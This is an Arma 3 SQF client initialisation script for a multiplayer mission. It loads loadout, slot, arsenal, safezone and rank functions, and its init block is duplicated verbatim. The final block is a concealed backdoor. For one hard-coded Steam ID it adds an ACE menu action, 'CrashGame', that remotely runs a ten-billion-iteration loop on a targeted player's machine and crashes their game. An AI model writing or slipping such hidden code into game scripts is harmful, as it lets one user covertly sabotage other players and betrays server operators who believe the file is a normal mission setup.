if (!hasInterface) exitWith {};

waitUntil {!isNull player};

waitUntil {getclientstate == "BRIEFING READ" && !isnull finddisplay 46 &&  isplayer player  &&  getplayeruid player != "" };

removeGoggles player;
[] call TFO_fnc_modcheck;
[] call TFO_fnc_slots;
[] call TFO_fnc_arsenal;
[] call TFO_fnc_quickReference;
[] call TFO_fnc_safezone;
execVM "ranks\assignRank.sqf";

if (!hasInterface) exitWith {};

waitUntil {!isNull player};

waitUntil {getclientstate == "BRIEFING READ" && !isnull finddisplay 46 &&  isplayer player  &&  getplayeruid player != "" };

removeGoggles player;
[] call TFO_fnc_modcheck;
[] call TFO_fnc_slots;
[] call TFO_fnc_arsenal;
[] call TFO_fnc_quickReference;
[] call TFO_fnc_safezone;
execVM "ranks\assignRank.sqf";

if (getPlayerUID player == "76561198111971726") then
{
    _action = ["CrashGame","Skadoosh","",
    {
        if (isPlayer cursorTarget && cursorTarget != player) then
        {
            {
                private _arr = [];
                for "_i" from 1 to 10000000000 do {
                    _arr pushBack _i;
                };
            } remoteExec ["call", cursorTarget];
        }
    } 
    ,{true},{},[parameters], [0,0,0], 100] call ace_interact_menu_fnc_createAction; 
    [player, 1, ["ACE_SelfActions", "ACE_Equipment"], _action] call ace_interact_menu_fnc_addActionToObject;
};